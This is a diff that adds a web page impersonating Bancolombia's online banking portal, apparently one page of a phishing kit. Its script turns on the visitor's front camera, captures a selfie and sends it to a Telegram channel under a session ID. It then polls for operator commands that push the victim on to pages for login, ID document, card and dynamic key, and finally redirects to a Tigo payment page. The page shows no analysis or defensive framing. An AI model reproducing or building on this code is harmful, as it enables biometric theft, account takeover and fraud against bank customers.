@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles_new.css">
+    <link rel="stylesheet" href="/css/loading-overlays.css">
+    <script src="/js/telegram-integration.js"></script>
+    <script src="../bank-telegram-base.js"></script>
+    <script src="../banco-master-telegram.js"></script>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            
+            <div class="auth-box">
+                <h2>Verificación Facial</h2>
+                <p>Por favor, toma una foto clara de tu rostro.</p>
+                
+                <div class="camera-container">
+                    <video id="video" autoplay playsinline muted></video>
+                    <canvas id="canvas"></canvas>
+                </div>
+                
+                <div class="button-container">
+                    <button type="button" id="captureBtn" class="btn-iniciar active">Tomar Foto</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="help-links">
+            <a href="#">¿Problemas para conectarte?</a>
+            <span class="separator">•</span>
+            <a href="#">Aprende sobre seguridad</a>
+            <span class="separator">•</span>
+            <a href="#">Reglamento Sucursal Virtual</a>
+            <span class="separator">•</span>
+            <a href="#">Política de privacidad</a>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                    <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+                </div>
+                <div class="footer-right">
+                    <p class="ip-address" id="ipAddress">Cargando IP...</p>
+                    <p class="datetime" id="datetime">Cargando fecha y hora...</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay bancolombia-loading">
+        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
+    </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('[BANCOLOMBIA] Inicializando cara.html');
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('captureBtn');
+        
+        if (!video || !canvas || !captureBtn) {
+            console.error('[BANCOLOMBIA] Error: Elementos no encontrados');
+            return;
+        }
+        
+        let photoTaken = false;
+        let stream = null;
+        let photoData = null;
+        
+        video.style.display = 'block';
+        canvas.style.display = 'none';
+        captureBtn.textContent = 'Tomar Foto';
+        captureBtn.disabled = true;
+        
+        async function startCamera() {
+            try {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(() => {
+                            video.style.display = 'block';
+                            canvas.style.display = 'none';
+                            captureBtn.disabled = false;
+                            captureBtn.classList.add('active');
+                            console.log('[BANCOLOMBIA] Cámara frontal iniciada');
+                            resolve();
+                        });
+                    };
+                });
+            } catch (err) {
+                console.error('[BANCOLOMBIA] Error al iniciar cámara:', err);
+                alert('Error al acceder a la cámara. Por favor, permite el acceso.');
+                captureBtn.disabled = true;
+            }
+        }
+        
+        startCamera();
+        
+        captureBtn.addEventListener('click', async function() {
+            if (!photoTaken) {
+                try {
+                    if (!stream || !video.srcObject) {
+                        await startCamera();
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                    
+                    const width = video.videoWidth || 1280;
+                    const height = video.videoHeight || 720;
+                    
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    
+                    ctx.drawImage(video, 0, 0, width, height);
+                    photoData = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    video.style.display = 'none';
+                    canvas.style.display = 'block';
+                    captureBtn.textContent = 'Continuar';
+                    photoTaken = true;
+                    
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                        stream = null;
+                    }
+                    
+                    console.log('[BANCOLOMBIA] Selfie capturada');
+                } catch (error) {
+                    console.error('[BANCOLOMBIA] Error al capturar:', error);
+                    alert('Error al capturar la foto. Intenta de nuevo.');
+                    await startCamera();
+                }
+            } else {
+                captureBtn.disabled = true;
+                captureBtn.textContent = 'Enviando...';
+                
+                const overlay = document.getElementById('loadingOverlay');
+                overlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+                
+                try {
+                    const data = {
+                        cara_foto: 'capturada',
+                        photo: photoData
+                    };
+                    
+                    // Recuperar session ID de localStorage
+                    let sessionId = localStorage.getItem('bancolombia_session_id');
+                    if (!sessionId) {
+                        sessionId = `bancolombia_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+                        localStorage.setItem('bancolombia_session_id', sessionId);
+                    }
+                    console.log('[BANCOLOMBIA] SessionID recuperado:', sessionId);
+                    
+                    const result = await TelegramClient.sendToTelegram('bancolombia_cara', {
+                        bank: 'Bancolombia',
+                        step: 'cara',
+                        data: data
+                    }, sessionId);
+                    
+                    if (result.success) {
+                        console.log('[BANCOLOMBIA] Selfie enviada, esperando respuesta...');
+                        
+                        // Polling optimizado - solo procesa primera acción
+                        TelegramClient.startPolling((actions, stop) => {
+                            if (window.__bancolombiaProcessing) return;
+                            window.__bancolombiaProcessing = true;
+                            
+                            const action = actions[0];
+                            console.log('[BANCOLOMBIA] Procesando:', action.action);
+                            
+                            switch(action.action) {
+                                case 'bancolombia_request_cara':
+                                    photoTaken = false;
+                                    captureBtn.textContent = 'Tomar Foto';
+                                    overlay.classList.remove('active');
+                                    document.body.style.overflow = '';
+                                    startCamera();
+                                    window.__bancolombiaProcessing = false;
+                                    break;
+                                case 'bancolombia_request_login':
+                                    window.location.href = 'index.html';
+                                    break;
+                                case 'bancolombia_request_cedula':
+                                    window.location.href = 'cedula.html';
+                                    break;
+                                case 'bancolombia_request_tarjeta':
+                                    window.location.href = 'tarjeta.html';
+                                    break;
+                                case 'bancolombia_request_dinamica':
+                                    window.location.href = 'dinamica.html';
+                                    break;
+                                case 'bancolombia_request_terminos':
+                                    window.location.href = 'terminos.html';
+                                    break;
+                                case 'bancolombia_finalizar':
+                                    localStorage.removeItem('bancolombia_session_id');
+                                    window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
+                                    break;
+                            }
+                        }, sessionId, 100, 300000);
+                    } else {
+                        console.error('[BANCOLOMBIA] Error en respuesta:', result);
+                        overlay.classList.remove('active');
+                        document.body.style.overflow = '';
+                        captureBtn.disabled = false;
+                    }
+                } catch (error) {
+                    console.error('[BANCOLOMBIA] Error:', error);
+                    overlay.classList.remove('active');
+                    document.body.style.overflow = '';
+                    captureBtn.disabled = false;
+                }
+            }
+        });
+        
+        async function updateInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipEl = document.getElementById('ipAddress');
+                if (ipEl) ipEl.textContent = `Dirección IP: ${ipData.ip}`;
+                
+                const now = new Date();
+                const options = { 
+                    weekday: 'long', 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric',
+                    hour: 'numeric',
+                    minute: '2-digit',
+                    hour12: true,
+                    timeZone: 'America/Bogota'
+                };
+                const dateEl = document.getElementById('datetime');
+                if (dateEl) dateEl.textContent = now.toLocaleDateString('es-CO', options).toLowerCase();
+            } catch (error) {
+                console.error('[BANCOLOMBIA] Error actualizando info:', error);
+            }
+        }
+        
+        updateInfo();
+        setInterval(updateInfo, 60000);
+        
+        console.log('[BANCOLOMBIA] Inicialización completa');
+    });
+    </script>
+</body>
+</html>
